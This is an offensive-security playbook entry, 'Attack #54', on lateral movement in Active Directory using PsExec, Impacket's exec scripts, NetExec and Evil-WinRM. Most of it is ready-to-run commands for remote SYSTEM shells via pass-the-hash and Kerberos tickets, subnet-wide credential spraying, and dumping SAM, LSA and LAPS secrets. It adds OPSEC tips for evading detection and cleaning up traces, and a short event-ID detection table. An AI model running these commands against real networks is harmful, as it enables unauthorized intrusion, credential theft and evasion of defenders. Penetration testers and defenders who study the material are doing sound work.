---
title: "Attack #54 — PsExec Remote Execution via SMB"
description: "PsExec is the most iconic lateral movement technique in Active Directory environments. It enables an attacker with valid administrator credentials to…"
category: active-directory
tags: ["active-directory", "kerberos", "privilege-escalation", "lateral-movement", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Evil-WinRM", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #54 — PsExec Remote Execution via SMB.md"
---
# ⚫ Attack #54 — PsExec / Remote Execution via SMB

***

## 📖 How It Works

PsExec is the **most iconic lateral movement technique in Active Directory environments**. It enables an attacker with valid administrator credentials to execute commands on remote Windows systems over the Server Message Block (SMB) protocol. The technique works by creating a temporary Windows service on the target machine, which executes the specified command under the SYSTEM context, then cleans up after itself.

The original Sysinternals PsExec is a legitimate Microsoft tool used by system administrators for remote management, which makes it inherently difficult to distinguish from normal administrative activity. However, Impacket's `psexec.py`, `smbexec.py`, and `wmiexec.py` provide even more flexible alternatives from Linux, each with different execution mechanics and detection characteristics.

### How PsExec Works Under the Hood

```
1. Authenticate to the target via SMB (port 445) using credentials, hash, or ticket
2. Connect to the ADMIN$ or C$ share (requires local admin privileges)
3. Upload a service binary to \\TARGET\ADMIN$\ (Sysinternals) or create inline service (Impacket)
4. Create and start a Windows service via the Service Control Manager (SCM)
5. The service executes the command as NT AUTHORITY\SYSTEM
6. Output is redirected back via a named pipe
7. Service is stopped and deleted (cleanup)
```

### Execution Method Comparison

| Tool | Upload Binary? | Service Created? | Execution Context | Stealth Level | Protocol |
|---|---|---|---|---|---|
| **Sysinternals PsExec** | Yes (PSEXESVC.exe) | Yes (PSEXESVC) | SYSTEM | Low — drops binary to disk | SMB |
| **Impacket psexec.py** | Yes (random .exe) | Yes (random name) | SYSTEM | Low — drops binary | SMB |
| **Impacket smbexec.py** | No | Yes (per-command) | SYSTEM | Medium — no binary on disk | SMB |
| **Impacket wmiexec.py** | No | No | User context | High — no service, no binary | WMI/DCOM |
| **Impacket atexec.py** | No | No (scheduled task) | SYSTEM | Medium — uses task scheduler | SMB |
| **Impacket dcomexec.py** | No | No | User context | High — uses DCOM objects | DCOM |

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin credentials on target** | Valid username + password, NT hash (PtH), or Kerberos ticket |
| **SMB access (port 445)** | Must be able to reach the target's SMB service |
| **ADMIN$ or C$ share accessible** | Requires administrative shares to be enabled (default on) |
| **No network segmentation blocking SMB** | Firewall must allow TCP 445 between source and target |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Sysinternals PsExec** | Windows | Original Microsoft tool — `PsExec.exe` |
| **Impacket — psexec.py** | Linux | Python implementation — drops binary to ADMIN$ |
| **Impacket — smbexec.py** | Linux | Fileless — creates service cmd per command |
| **Impacket — wmiexec.py** | Linux | Most stealthy — uses WMI, no service creation |
| **Impacket — atexec.py** | Linux | Uses Task Scheduler for execution |
| **Impacket — dcomexec.py** | Linux | Uses DCOM objects for execution |
| **CrackMapExec / NetExec** | Linux | Mass execution — spray commands across networks |
| **Evil-WinRM** | Linux | WinRM-based shell (port 5985/5986) |

***

## 💻 Full Commands

### 🔴 Sysinternals PsExec (Windows → Windows)

```powershell
# ── Interactive SYSTEM shell on remote host ───────────────────────────────────
PsExec.exe \\TARGET cmd.exe
# Prompts for credentials if not running as DA

# ── With explicit credentials ─────────────────────────────────────────────────
PsExec.exe \\TARGET -u CORP\Administrator -p 'Password1' cmd.exe

# ── Run as SYSTEM on remote host ──────────────────────────────────────────────
PsExec.exe -s \\TARGET cmd.exe
# -s = run as SYSTEM (default for remote execution)

# ── Execute a specific command (non-interactive) ──────────────────────────────
PsExec.exe \\TARGET -u CORP\Administrator -p 'Password1' ipconfig /all

# ── Execute on multiple targets ───────────────────────────────────────────────
PsExec.exe \\TARGET1,TARGET2,TARGET3 -u CORP\Administrator -p 'Password1' whoami

# ── Execute on all computers in a file ────────────────────────────────────────
PsExec.exe @computers.txt -u CORP\Administrator -p 'Password1' hostname

# ── Copy a binary to remote host and execute ──────────────────────────────────
PsExec.exe \\TARGET -u CORP\Administrator -p 'Password1' -c mimikatz.exe
# -c = copy the specified program to ADMIN$ then execute it

# ── Run with alternate credentials (pass current token) ──────────────────────
# If you have a Kerberos ticket injected via PtT / Golden Ticket:
PsExec.exe \\DC01.corp.local cmd.exe
# Uses the current session's Kerberos tickets automatically
```

***

### 🔴 Impacket — psexec.py (Linux → Windows)

```bash
# ── Interactive SYSTEM shell with password ────────────────────────────────────
psexec.py corp.local/Administrator:'Password1'@10.10.10.10

# ── With domain prefix ────────────────────────────────────────────────────────
psexec.py 'corp.local/Administrator:Password1@10.10.10.10'

# ── Pass-the-Hash (no password needed) ────────────────────────────────────────
psexec.py corp.local/Administrator@10.10.10.10 \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe

# ── Kerberos authentication (with cached ticket) ─────────────────────────────
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# ── Execute specific command ──────────────────────────────────────────────────
psexec.py corp.local/Administrator:'Password1'@10.10.10.10 "whoami /all"

# ── Use local admin account (no domain) ───────────────────────────────────────
psexec.py ./Administrator:'Password1'@10.10.10.10
```

***

### 🔴 Impacket — smbexec.py (Fileless — No Binary Drop)

```bash
# ── Fileless shell via service creation ───────────────────────────────────────
smbexec.py corp.local/Administrator:'Password1'@10.10.10.10

# ── With PtH ──────────────────────────────────────────────────────────────────
smbexec.py corp.local/Administrator@10.10.10.10 \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe

# ── Kerberos ──────────────────────────────────────────────────────────────────
export KRB5CCNAME=administrator.ccache
smbexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# How smbexec works differently from psexec:
# - Does NOT upload a binary to the target
# - Creates a service per command that runs: %COMSPEC% /Q /c <command> 1> output 2>&1
# - Output is written to a file on ADMIN$ share, then read back
# - Service is deleted after each command
# - Stealthier than psexec (no file on disk) but creates more Event 7045 entries
```

***

### 🔴 Impacket — wmiexec.py (Most Stealthy — No Service)

```bash
# ── Stealthy shell via WMI ────────────────────────────────────────────────────
wmiexec.py corp.local/Administrator:'Password1'@10.10.10.10

# ── With PtH ──────────────────────────────────────────────────────────────────
wmiexec.py corp.local/Administrator@10.10.10.10 \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe

# ── Kerberos ──────────────────────────────────────────────────────────────────
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local

# ── Execute single command ────────────────────────────────────────────────────
wmiexec.py corp.local/Administrator:'Password1'@10.10.10.10 "whoami /all"

# How wmiexec works:
# - Uses WMI (DCOM port 135 + dynamic RPC) instead of SMB services
# - Spawns cmd.exe via Win32_Process.Create()
# - Does NOT create a service (no Event 7045)
# - Does NOT upload any binary
# - Output redirected to \\127.0.0.1\ADMIN$\__<random>
# - Runs as the authenticated user (not SYSTEM by default)
# - Most stealthy of all Impacket exec tools
```

***

### 🔴 Impacket — atexec.py (Task Scheduler)

```bash
# ── Execute via scheduled task ────────────────────────────────────────────────
atexec.py corp.local/Administrator:'Password1'@10.10.10.10 "whoami"

# ── With PtH ──────────────────────────────────────────────────────────────────
atexec.py corp.local/Administrator@10.10.10.10 \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe "ipconfig /all"

# How atexec works:
# - Creates a scheduled task on the remote host
# - Task executes the command and writes output to a temp file
# - Output is read back via SMB
# - Task is deleted after execution
# - Uses the Task Scheduler service instead of SCM
```

***

### 🔴 CrackMapExec / NetExec — Mass Execution

```bash
# ── Single target — execute command ───────────────────────────────────────────
nxc smb 10.10.10.10 -u Administrator -p 'Password1' -x "whoami"
nxc smb 10.10.10.10 -u Administrator -p 'Password1' -X "Get-Process"  # PowerShell

# ── PtH ───────────────────────────────────────────────────────────────────────
nxc smb 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -x "whoami"

# ── Kerberos ──────────────────────────────────────────────────────────────────
nxc smb DC01.corp.local --use-kcache -x "whoami"

# ── Spray across subnet — find where credentials work ────────────────────────
nxc smb 10.10.10.0/24 -u Administrator -p 'Password1'
# Look for (Pwn3d!) in output = admin access confirmed

# ── Mass command execution across all accessible hosts ────────────────────────
nxc smb 10.10.10.0/24 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe \
  -x "whoami" --exec-method smbexec

# ── Execution methods ────────────────────────────────────────────────────────
# --exec-method smbexec   → Fileless service execution
# --exec-method wmiexec   → WMI-based execution
# --exec-method atexec    → Scheduled task execution
# --exec-method mmcexec   → MMC-based execution

# ── Dump SAM via CME ──────────────────────────────────────────────────────────
nxc smb 10.10.10.10 -u Administrator -p 'Password1' --sam

# ── Dump LSA secrets ──────────────────────────────────────────────────────────
nxc smb 10.10.10.10 -u Administrator -p 'Password1' --lsa

# ── Dump LAPS passwords ──────────────────────────────────────────────────────
nxc ldap DC01.corp.local -u Administrator -p 'Password1' --laps
```

***

### 🔴 Evil-WinRM (WinRM-Based Shell)

```bash
# ── Interactive PowerShell shell via WinRM ────────────────────────────────────
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1'

# ── PtH ───────────────────────────────────────────────────────────────────────
evil-winrm -i 10.10.10.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe

# ── Kerberos ──────────────────────────────────────────────────────────────────
evil-winrm -i DC01.corp.local -r corp.local

# ── Upload/download files ────────────────────────────────────────────────────
# Inside evil-winrm session:
upload /local/path/mimikatz.exe C:\Temp\mimikatz.exe
download C:\Users\Administrator\Desktop\flag.txt /local/path/flag.txt

# ── Load PowerShell scripts ──────────────────────────────────────────────────
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1' -s /path/to/scripts/
# Inside session: menu → loads scripts from the specified directory

# Note: WinRM uses port 5985 (HTTP) or 5986 (HTTPS), not SMB port 445
```

***

## 🎯 OPSEC Tips

- **wmiexec.py is the stealthiest** — no binary uploaded, no Windows service created, no Event 7045; only creates `cmd.exe` via WMI
- **smbexec.py is a good middle ground** — no binary on disk, but does create temporary services (generates Event 7045 per command)
- **psexec.py is the loudest** — uploads a binary to ADMIN$, creates a persistent service with a recognizable random name
- **Sysinternals PsExec leaves `PSEXESVC.exe`** on the target — this is a well-known IOC; use `PsExec -r <custom_name>` to change the service name
- **Use Kerberos authentication** over NTLM when possible — NTLM generates more detectable network traffic
- **Avoid spraying commands** across the entire subnet unless time-constrained — mass execution via CME/NXE generates correlated authentication events
- **Clean up after execution** — delete uploaded binaries, check for leftover services (`sc query type=own`), remove temp files

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **7045** | System Log | New service installed — random name, binary in `C:\Windows` or ADMIN$ (PsExec, smbexec) |
| **4697** | Security Log | Service installation — same as 7045 but in Security log |
| **4624** | Security Log | Logon Type 3 (Network) — admin account authenticating from unexpected source |
| **4672** | Security Log | Special privileges assigned to network logon |
| **5145** | Security Log | Network share accessed — `ADMIN$`, `C$`, `IPC$` access from workstations |
| **4688** | Security Log | Process creation — `cmd.exe` spawned by service or `wmiprvse.exe` |
| **Sysmon 1** | Sysmon | Process creation with command line — catch the actual commands executed |
| **Sysmon 11** | Sysmon | File creation — PsExec binary written to ADMIN$ share |

**Primary detection signature:** **Event 7045** with a service binary path pointing to `C:\Windows\` or `%SystemRoot%\` with a random-looking name is the classic PsExec/smbexec indicator. For wmiexec, monitor for `wmiprvse.exe` spawning `cmd.exe` via **Event 4688** with Command Line Auditing enabled. Correlate all of these with **Event 4624 Type 3** from unexpected source IPs to identify lateral movement campaigns.

***

## 🔗 Attack Chain Context

```
[PsExec / SMB Execution] ──→ Lateral Movement Across the Domain
         │
         ├──→ 🔑 Requires: valid admin creds (local or domain) or PtH/PtT
         ├──→ 💻 Execute as SYSTEM on any remote host with admin access
         ├──→ 🩸 Post-access: dump LSASS → extract more creds → pivot further
         ├──→ 📋 Chain: Password Spray (#1) → PtH (#4) → PsExec → more creds
         ├──→ 🌐 Mass execution: spray across subnet to identify admin access
         ├──→ 🔗 Commonly follows: credential attacks, kerberos abuse, token impersonation
         └──→ 💀 Defeated by: disable ADMIN$, network segmentation, LAPS, EDR
```

**PsExec-style lateral movement is the backbone of AD engagements.** After obtaining any form of admin credentials (PtH, cracked passwords, Kerberoast, etc.), the first action is always to spray those credentials and execute on as many machines as possible — extracting more credentials from each compromised host in a snowball effect until Domain Admin is achieved.

***

> ✅ **Attack #54 — PsExec / Remote Execution via SMB complete.**
